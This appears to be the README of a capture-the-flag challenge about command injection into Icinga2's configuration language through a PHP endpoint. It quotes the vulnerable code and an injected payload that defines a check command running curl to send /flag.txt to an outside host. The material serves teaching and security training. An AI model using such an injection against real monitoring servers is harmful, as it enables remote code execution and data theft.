# Host collector

This challenge is a basic command injection based on a vulnerable service which communicates with an icinga2 container.  
The biggest difficulty will probably be figuring out how icinga2 works and what to create, as the command injection should be pretty easy to spot.

### Environment description
The service consists of a single container that contains both an icinga2 instance and a service (`runtime.php`).  
Such service performs two things:  
- exposes an `/icinga/create_host` endpoint on port 9090  
- uses Icinga2's API to create a host whenever contacted via the endpoint  

### Vulnerability description
The PHP service exposes an endpoint at `/icinga/create_host` which builds an icinga2 command to create a host.  
Such command is then sent to icinga2 using it's [execute command API](https://icinga.com/docs/icinga-2/latest/doc/12-icinga2-api/#execute-command).  
When building the command, a command injection vulnerability is being exposed at line 22 of `src/runtime.php`:  
```php
$definition = sprintf('object Host %s { check_command = "hostalive"; address = "%s" }', $objectName, $address);
$command = sprintf("f = function() {\n%s\n}\nInternal.run_with_activation_context(f)", $definition);
```

The user is supposed to find out that the command is being build using Icinga2's custom language: [Icinga2 language reference](https://icinga.com/docs/icinga-2/latest/doc/17-language-reference/).  
From there, the idea is to inject a command which creates a custom `CheckCommand` object containing the malicious command (e.g. a reverse shell), and a Host which uses such CheckCommand.  
When created, the Icinga2 instance will periodically check the status of each host using their configured `CheckCommand`s, thus leading to the  execution of the malicious code.  

The provided `exploit.sh` script leads to the execution of the following icinga2 command ('||' characters are used to mark the start and end of the payload):  
```
f = function() {
object Host || "pippo" { address = "127.0.0.1", check_command = "hostalive" }
object CheckCommand "reverse" { command = [ "/usr/bin/curl", "--data-binary", "@/flag.txt", "host.docker.internal:42000" ] }
object Host "surprise" { check_command = "reverse", address = "127.0.0.1", check_interval = 1s }
object Host "pippone" || { check_command = "hostalive"; address = "127.0.0.1" }
}
Internal.run_with_activation_context(f)
```
